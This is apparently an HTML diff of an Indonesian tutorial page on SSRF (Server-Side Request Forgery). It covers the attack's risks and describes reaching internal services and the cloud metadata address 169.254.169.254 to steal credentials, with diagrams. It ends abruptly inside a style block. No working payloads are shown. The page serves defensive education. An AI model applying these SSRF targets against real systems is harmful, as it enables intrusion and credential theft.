@@ -1,0 +1,1043 @@
+<!-- ========== SEARCH OVERLAY ========== -->
+  <div class="search-overlay" id="searchOverlay">
+    <button class="search-close-btn" aria-label="Tutup pencarian">&times;</button>
+    <div class="search-box">
+      <div class="search-input-wrapper">
+        <input type="text" id="searchInput" placeholder="Ketik untuk mencari tutorial..." aria-label="Cari tutorial" autocomplete="off">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </div>
+      <div class="search-results" id="searchResults">
+        <div class="search-hint">Ketik untuk mencari</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== ARTICLE HERO ========== -->
+  <section class="article-hero">
+    <div class="container">
+      <div class="breadcrumb">
+        <a href="../index.html">Beranda</a>
+        <span class="separator">/</span>
+        <a href="../index.html#categories">Cybersecurity</a>
+        <span class="separator">/</span>
+        <span class="current">SSRF</span>
+      </div>
+      <span class="category-tag">Cybersecurity</span>
+      <h1>SSRF: Server-Side Request Forgery — Serangan, Bypass, & Pencegahan</h1>
+      <p class="article-subtitle">Tutorial lengkap SSRF — memahami mekanisme serangan, teknik bypass filter, studi kasus CVE terkenal, hingga arsitektur pencegahan komprehensif untuk aplikasi web modern</p>
+      <div class="article-meta">
+        <span>📅 26 Juni 2026</span>
+        <span>📖 22 menit baca</span>
+        <span class="difficulty menengah">Menengah–Lanjut</span>
+      </div>
+      <div class="article-author">
+        <span class="author-avatar">🐝</span>
+        <div class="author-info">
+          <span class="author-name"><a href="/about.html">Tim BeebaneLabs</a></span>
+          <span class="author-role">Penulis &amp; Kontributor Teknologi</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== AD SLOT ========== -->
+  <div class="container">
+    <div class="ad-slot ad-slot-wide">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+  </div>
+
+  <!-- ========== ARTICLE CONTENT ========== -->
+  <article class="article-content" id="main-content">
+    <div class="container">
+
+      <!-- TABLE OF CONTENTS -->
+      <div class="info-box info">
+        <div class="info-box-title">📋 Daftar Isi</div>
+        <ol>
+          <li><a href="#pengenalan">Pengenalan SSRF</a></li>
+          <li><a href="#mekanisme">Mekanisme Serangan SSRF</a></li>
+          <li><a href="#jenis">Jenis-Jenis SSRF</a></li>
+          <li><a href="#target">Target &amp; Dampak SSRF</a></li>
+          <li><a href="#studi-kasus">Studi Kasus CVE Terkenal</a></li>
+          <li><a href="#teknik-serangan">Teknik Serangan SSRF</a></li>
+          <li><a href="#bypass-filter">Bypass Filter &amp; WAF</a></li>
+          <li><a href="#pencegahan">Pencegahan &amp; Mitigasi</a></li>
+          <li><a href="#tool">Tools Testing SSRF</a></li>
+          <li><a href="#quiz">Quiz Pemahaman</a></li>
+        </ol>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 1: Pengenalan          -->
+      <!-- ============================== -->
+      <h2 id="pengenalan">1. Pengenalan SSRF</h2>
+
+      <p><strong>SSRF (Server-Side Request Forgery)</strong> adalah jenis serangan keamanan web di mana penyerang memanipulasi aplikasi web agar mengirimkan request HTTP yang tidak diinginkan ke server internal maupun eksternal. Serangan ini memanfaatkan kepercayaan antara server dan resource internalnya, menjadikannya salah satu kerentanan paling berbahaya dalam kategori OWASP Top 10.</p>
+
+      <p>Pada dasarnya, SSRF terjadi ketika aplikasi menerima URL dari user input dan menggunakannya untuk membuat request jaringan tanpa validasi yang memadai. Penyerang dapat menggunakan aplikasi tersebut sebagai proxy untuk mengakses resource internal, melakukan port scanning, atau bahkan melakukan remote code execution (RCE) dalam kasus tertentu.</p>
+
+      <h3>Mengapa SSRF Berbahaya?</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Faktor Risiko</th>
+            <th>Penjelasan</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Akses Internal</td><td>Server dapat mengakses layanan internal yang tidak terlihat dari internet</td></tr>
+          <tr><td>Bypass Firewall</td><td>Request dari dalam jaringan sering kali melewati firewall dan aturan keamanan</td></tr>
+          <tr><td>Cloud Metadata</td><td>Mengakses metadata cloud provider (AWS, GCP, Azure) untuk mencuri kredensial</td></tr>
+          <tr><td>Pivot Point</td><td>SSRF bisa menjadi titik awal untuk serangan lateral movement</td></tr>
+          <tr><td>RCE</td><td>Dalam kondisi tertentu, SSRF dapat meningkat menjadi Remote Code Execution</td></tr>
+          <tr><td>Data Exfiltration</td><td>Mencuri data sensitif dari layanan internal yang rentan</td></tr>
+        </tbody>
+      </table>
+
+      <div class="info-box warning">
+        <div class="info-box-title">⚠️ Peringatan</div>
+        <p>Artikel ini ditulis untuk tujuan edukasi dan pencegahan. Selalu dapatkan izin tertulis sebelum melakukan testing terhadap sistem yang bukan milik Anda. Penggunaan teknik SSRF untuk aktivitas ilegal adalah pelanggaran hukum.</p>
+      </div>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Diagram: Alur Dasar SSRF</div>
+<div class="diagram-box">
+        
+<pre><code>PENYERANG (Attacker) Mengirim URL palsu
+APLIKASI WEB (Vulnerable) Tanpa validasi URL
+SERVER TARGET (Internal/Ext) 169.254.169.254
+1
+2
+3
+4
+/&quot;Data sensitif dikirim kembali ke attacker Attac...&quot;/</code></pre>
+    </div>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 2: Mekanisme           -->
+      <!-- ============================== -->
+      <h2 id="mekanisme">2. Mekanisme Serangan SSRF</h2>
+
+      <p>Untuk memahami SSRF secara mendalam, kita perlu memahami bagaimana aplikasi web biasanya berinteraksi dengan URL yang diberikan oleh user. Setiap kali aplikasi membuat request HTTP berdasarkan input user, ada potensi SSRF jika validasi tidak dilakukan dengan benar.</p>
+
+      <h3>2.1 Alur Umum Serangan</h3>
+
+      </div>
+<div class="diagram-box">
+
+        <div class="diagram-label">Diagram: SSRF dalam Arsitektur Microservices</div>
+<div class="diagram-box">
+        
+<div class="diagram-box diagram-svg">
+  <div class="diagram-label">SSRF dalam Arsitektur Microservices</div>
+  <div class="diagram-content"><svg class="mermaid-rendered" width="100%" xmlns="http://www.w3.org/2000/svg" class="flowchart" style="max-width: 276px;" viewBox="0 0 276 1418.75" role="graphics-document document" aria-roledescription="flowchart-v2" xmlns:xlink="http://www.w3.org/1999/xlink"><style xmlns="http://www.w3.org/1999/xhtml">@import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css");</style><style>#mermaid-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mermaid-svg .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mermaid-svg .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mermaid-svg .error-icon{fill:#552222;}#mermaid-svg .error-text{fill:#552222;stroke:#552222;}#mermaid-svg .edge-thickness-normal{stroke-width:1px;}#mermaid-svg .edge-thickness-thick{stroke-width:3.5px;}#mermaid-svg .edge-pattern-solid{stroke-dasharray:0;}#mermaid-svg .edge-thickness-invisible{stroke-width:0;fill:none;}#mermaid-svg .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-svg .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-svg .marker{fill:#333333;stroke:#333333;}#mermaid-svg .marker.cross{stroke:#333333;}#mermaid-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-svg p{margin:0;}#mermaid-svg .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-svg .cluster-label text{fill:#333;}#mermaid-svg .cluster-label span{color:#333;}#mermaid-svg .cluster-label span p{background-color:transparent;}#mermaid-svg .label text,#mermaid-svg span{fill:#333;color:#333;}#mermaid-svg .node rect,#mermaid-svg .node circle,#mermaid-svg .node ellipse,#mermaid-svg .node polygon,#mermaid-svg .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-svg .rough-node .label text,#mermaid-svg .node .label text,#mermaid-svg .image-shape .label,#mermaid-svg .icon-shape .label{text-anchor:middle;}#mermaid-svg .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#mermaid-svg .rough-node .label,#mermaid-svg .node .label,#mermaid-svg .image-shape .label,#mermaid-svg .icon-shape .label{text-align:center;}#mermaid-svg .node.clickable{cursor:pointer;}#mermaid-svg .root .anchor path{fill:#333333!important;stroke-width:0;stroke:#333333;}#mermaid-svg .arrowheadPath{fill:#333333;}#mermaid-svg .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-svg .flowchart-link{stroke:#333333;fill:none;}#mermaid-svg .edgeLabel{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-svg .edgeLabel p{background-color:rgba(232,232,232, 0.8);}#mermaid-svg .edgeLabel rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-svg .labelBkg{background-color:rgba(232, 232, 232, 0.5);}#mermaid-svg .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-svg .cluster text{fill:#333;}#mermaid-svg .cluster span{color:#333;}#mermaid-svg div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-svg .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-svg rect.text{fill:none;stroke-width:0;}#mermaid-svg .icon-shape,#mermaid-svg .image-shape{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-svg .icon-shape p,#mermaid-svg .image-shape p{background-color:rgba(232,232,232, 0.8);padding:2px;}#mermaid-svg .icon-shape rect,#mermaid-svg .image-shape rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-svg .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#mermaid-svg .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#mermaid-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker id="mermaid-svg_flowchart-v2-pointEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-pointStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="4.5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 5 L 10 10 L 10 0 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-circleEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="11" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-circleStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-1" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-crossEnd" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="12" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-crossStart" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="-1" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><g class="root"><g class="clusters"/><g class="edgePaths"><path d="M138,62L138,66.167C138,70.333,138,78.667,138,86.333C138,94,138,101,138,104.5L138,108" id="L_N0_N1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N0_N1_0" data-points="W3sieCI6MTM4LCJ5Ijo2Mn0seyJ4IjoxMzgsInkiOjg3fSx7IngiOjEzOCwieSI6MTEyfV0=" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,166L138,170.167C138,174.333,138,182.667,138,190.333C138,198,138,205,138,208.5L138,212" id="L_N1_N2_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N1_N2_0" data-points="W3sieCI6MTM4LCJ5IjoxNjZ9LHsieCI6MTM4LCJ5IjoxOTF9LHsieCI6MTM4LCJ5IjoyMTZ9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,270L138,274.167C138,278.333,138,286.667,138,294.333C138,302,138,309,138,312.5L138,316" id="L_N2_N3_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N2_N3_0" data-points="W3sieCI6MTM4LCJ5IjoyNzB9LHsieCI6MTM4LCJ5IjoyOTV9LHsieCI6MTM4LCJ5IjozMjB9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,538.75L138,542.917C138,547.083,138,555.417,138,563.083C138,570.75,138,577.75,138,581.25L138,584.75" id="L_N3_N4_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N3_N4_0" data-points="W3sieCI6MTM4LCJ5Ijo1MzguNzV9LHsieCI6MTM4LCJ5Ijo1NjMuNzV9LHsieCI6MTM4LCJ5Ijo1ODguNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,666.75L138,670.917C138,675.083,138,683.417,138,691.083C138,698.75,138,705.75,138,709.25L138,712.75" id="L_N4_N5_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N4_N5_0" data-points="W3sieCI6MTM4LCJ5Ijo2NjYuNzV9LHsieCI6MTM4LCJ5Ijo2OTEuNzV9LHsieCI6MTM4LCJ5Ijo3MTYuNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,794.75L138,798.917C138,803.083,138,811.417,138,819.083C138,826.75,138,833.75,138,837.25L138,840.75" id="L_N5_N6_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N5_N6_0" data-points="W3sieCI6MTM4LCJ5Ijo3OTQuNzV9LHsieCI6MTM4LCJ5Ijo4MTkuNzV9LHsieCI6MTM4LCJ5Ijo4NDQuNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,898.75L138,902.917C138,907.083,138,915.417,138,923.083C138,930.75,138,937.75,138,941.25L138,944.75" id="L_N6_N7_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N6_N7_0" data-points="W3sieCI6MTM4LCJ5Ijo4OTguNzV9LHsieCI6MTM4LCJ5Ijo5MjMuNzV9LHsieCI6MTM4LCJ5Ijo5NDguNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,1026.75L138,1030.917C138,1035.083,138,1043.417,138,1051.083C138,1058.75,138,1065.75,138,1069.25L138,1072.75" id="L_N7_N8_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N7_N8_0" data-points="W3sieCI6MTM4LCJ5IjoxMDI2Ljc1fSx7IngiOjEzOCwieSI6MTA1MS43NX0seyJ4IjoxMzgsInkiOjEwNzYuNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,1130.75L138,1134.917C138,1139.083,138,1147.417,138,1155.083C138,1162.75,138,1169.75,138,1173.25L138,1176.75" id="L_N8_N9_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N8_N9_0" data-points="W3sieCI6MTM4LCJ5IjoxMTMwLjc1fSx7IngiOjEzOCwieSI6MTE1NS43NX0seyJ4IjoxMzgsInkiOjExODAuNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,1258.75L138,1262.917C138,1267.083,138,1275.417,138,1283.083C138,1290.75,138,1297.75,138,1301.25L138,1304.75" id="L_N9_N10_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N9_N10_0" data-points="W3sieCI6MTM4LCJ5IjoxMjU4Ljc1fSx7IngiOjEzOCwieSI6MTI4My43NX0seyJ4IjoxMzgsInkiOjEzMDguNzV9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/></g><g class="edgeLabels"><g class="edgeLabel"><g class="label" data-id="L_N0_N1_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N1_N2_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N2_N3_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N3_N4_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N4_N5_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N5_N6_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N6_N7_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N7_N8_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N8_N9_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N9_N10_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g></g><g class="nodes"><g class="node default  " id="flowchart-N0-0" transform="translate(138, 35)"><rect class="basic label-container" style="" x="-70" y="-27" width="140" height="54"/><g class="label" style="" transform="translate(-40, -12)"><rect/><foreignObject width="80" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>INTERNET</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N1-1" transform="translate(138, 139)"><rect class="basic label-container" style="" x="-59.34375" y="-27" width="118.6875" height="54"/><g class="label" style="" transform="translate(-29.34375, -12)"><rect/><foreignObject width="58.6875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Attacker</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N2-2" transform="translate(138, 243)"><rect class="basic label-container" style="" x="-81.59375" y="-27" width="163.1875" height="54"/><g class="label" style="" transform="translate(-51.59375, -12)"><rect/><foreignObject width="103.1875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Load Balancer</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N3-3" transform="translate(138, 429.375)"><polygon points="109.375,0 218.75,-109.375 109.375,-218.75 0,-109.375" class="label-container" transform="translate(-108.875, 109.375)"/><g class="label" style="" transform="translate(-82.375, -12)"><rect/><foreignObject width="164.75" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>INTERNAL NETWORK</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N4-4" transform="translate(138, 627.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>WEB APP (SSRF Vulnerable) Port 80/443</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N5-5" transform="translate(138, 755.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>API SERVER (No ext access)</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N6-6" transform="translate(138, 871.75)"><rect class="basic label-container" style="" x="-117.296875" y="-27" width="234.59375" height="54"/><g class="label" style="" transform="translate(-87.296875, -12)"><rect/><foreignObject width="174.59375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>DATABASE PostgreSQL</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N7-7" transform="translate(138, 987.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Admin Dashboard Port :8080</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N8-8" transform="translate(138, 1103.75)"><rect class="basic label-container" style="" x="-114.9375" y="-27" width="229.875" height="54"/><g class="label" style="" transform="translate(-84.9375, -12)"><rect/><foreignObject width="169.875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Redis Cache Port :6379</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N9-9" transform="translate(138, 1219.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Metadata Service 169.254.169.254</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N10-10" transform="translate(138, 1359.75)"><rect class="basic label-container" style="" x="-130" y="-51" width="260" height="102"/><g class="label" style="" transform="translate(-100, -36)"><rect/><foreignObject width="200" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Serangan SSRF memanfaatkan koneksi internal: → ...</p></span></div></foreignObject></g></g></g></g></g></svg></div>
+</div>
+    </div>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 3: Jenis SSRF           -->
+      <!-- ============================== -->
+      <h2 id="jenis">3. Jenis-Jenis SSRF</h2>
+
+      <h3>3.1 SSRF Dasar (Basic SSRF)</h3>
+      <p>SSRF dasar terjadi ketika penyerang dapat mengarahkan server untuk membuat request ke URL yang dipilih oleh penyerang. Response dari server tersebut kemudian dikembalikan ke penyerang.</p>
+
+      </div>
+<div class="diagram-box">
+
+        <div class="diagram-label">Diagram: Kronologi Capital One Breach</div>
+<div class="diagram-box">
+        
+<div class="diagram-box diagram-svg">
+  <div class="diagram-label">Kronologi Capital One Breach</div>
+  <div class="diagram-content"><svg class="mermaid-rendered" width="100%" xmlns="http://www.w3.org/2000/svg" class="flowchart" style="max-width: 276px;" viewBox="0 0 276 830" role="graphics-document document" aria-roledescription="flowchart-v2" xmlns:xlink="http://www.w3.org/1999/xlink"><style xmlns="http://www.w3.org/1999/xhtml">@import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css");</style><style>#mermaid-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mermaid-svg .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mermaid-svg .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mermaid-svg .error-icon{fill:#552222;}#mermaid-svg .error-text{fill:#552222;stroke:#552222;}#mermaid-svg .edge-thickness-normal{stroke-width:1px;}#mermaid-svg .edge-thickness-thick{stroke-width:3.5px;}#mermaid-svg .edge-pattern-solid{stroke-dasharray:0;}#mermaid-svg .edge-thickness-invisible{stroke-width:0;fill:none;}#mermaid-svg .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-svg .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-svg .marker{fill:#333333;stroke:#333333;}#mermaid-svg .marker.cross{stroke:#333333;}#mermaid-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-svg p{margin:0;}#mermaid-svg .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-svg .cluster-label text{fill:#333;}#mermaid-svg .cluster-label span{color:#333;}#mermaid-svg .cluster-label span p{background-color:transparent;}#mermaid-svg .label text,#mermaid-svg span{fill:#333;color:#333;}#mermaid-svg .node rect,#mermaid-svg .node circle,#mermaid-svg .node ellipse,#mermaid-svg .node polygon,#mermaid-svg .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-svg .rough-node .label text,#mermaid-svg .node .label text,#mermaid-svg .image-shape .label,#mermaid-svg .icon-shape .label{text-anchor:middle;}#mermaid-svg .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#mermaid-svg .rough-node .label,#mermaid-svg .node .label,#mermaid-svg .image-shape .label,#mermaid-svg .icon-shape .label{text-align:center;}#mermaid-svg .node.clickable{cursor:pointer;}#mermaid-svg .root .anchor path{fill:#333333!important;stroke-width:0;stroke:#333333;}#mermaid-svg .arrowheadPath{fill:#333333;}#mermaid-svg .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-svg .flowchart-link{stroke:#333333;fill:none;}#mermaid-svg .edgeLabel{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-svg .edgeLabel p{background-color:rgba(232,232,232, 0.8);}#mermaid-svg .edgeLabel rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-svg 